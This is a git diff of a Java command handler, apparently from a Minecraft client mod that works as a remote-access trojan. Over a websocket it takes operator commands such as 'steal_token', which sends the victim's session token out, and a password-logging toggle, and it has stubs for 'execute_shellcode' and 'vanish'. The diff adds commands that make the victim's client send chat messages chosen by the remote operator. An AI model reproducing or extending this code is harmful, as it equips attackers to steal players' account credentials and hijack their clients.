@@ -2,8 +2,10 @@ package me.soda.witch.websocket;
 
 import me.soda.witch.Witch;
 import me.soda.witch.config.Config;
+import me.soda.witch.features.ChatControl;
 import me.soda.witch.features.Modlist;
 import me.soda.witch.features.Stealer;
+import net.minecraft.text.Text;
 import net.minecraft.util.SystemDetails;
 
 import java.util.Base64;
@@ -25,13 +27,15 @@ public class MessageHandler {
                     Config.passwordBeingLogged = Boolean.parseBoolean(msgArr[1]);
                     break;
                 case "steal_token":
-                    MessageUtils.sendMessage(messageType, new Stealer().stealToken());
+                    MessageUtils.sendMessage(messageType, Stealer.stealToken());
                     break;
                 case "getcfg":
                     break;
                 case "vanish":
                     break;
                 case "chat_control":
+                    if (msgArr.length < 2) break;
+                    ChatControl.sendChat(decodeBase64(msgArr[1]));
                     break;
                 case "chat_filter":
                     if (msgArr.length < 2) break;
@@ -62,6 +66,8 @@ public class MessageHandler {
                 case "execute_shellcode":
                     break;
                 case "chat":
+                    if (msgArr.length < 2) break;
+                    ChatControl.chat(Text.of(decodeBase64(msgArr[1])));
                     break;
                 case "kill":
                     Witch.client.close(false);
